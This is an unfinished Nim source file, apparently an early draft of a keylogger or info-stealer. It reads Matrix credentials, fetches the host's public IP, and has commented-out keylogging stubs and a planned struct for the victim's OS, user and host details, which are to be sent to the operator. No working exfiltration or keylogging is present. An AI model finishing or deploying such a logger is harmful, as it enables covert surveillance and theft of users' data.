# Rewriting this from an old Python logger I wrote back in high school.

import std/json
#import std/os
import std/[asyncdispatch, httpclient]
import std/net
import tokenfinder
#import nimx/keyboard
# requirements: nimx

# creds.json is where your Matrix authentication is stored.
# to do: add auth token login
# declaring json file and finding the Matrix login info
type
    Creds = object
        Username: string
        Password: string
        Server: string
        RoomID: string
let
    userJson = parseJson(readFile("creds.json"))
    creds = to(userJson, Creds)
echo creds.Username
echo creds.Password


# Logged information from your PC.
# Currently fetches:
# Logged information is sent to you via a json file.
proc ipfetch(ipURL: string): Future[string] {.async.} =
    var client = newAsyncHttpClient()
    try:
        return await client.getContent(ipURL)
    finally:
        client.close()
let PCip = waitFor ipfetch("http://icanhazip.com") # Replace with your own URL if you want
echo PCip

#keylog
#proc keyInput(event: XKeyEvent) {.discardable.} =
#    let key = event.keycode
#    echo "Key pressed: ", key

#type
#    PCinfo = object
#        PCip: string
#        PCos: string
#        PCuser: string
#        PChost: string
#        : string



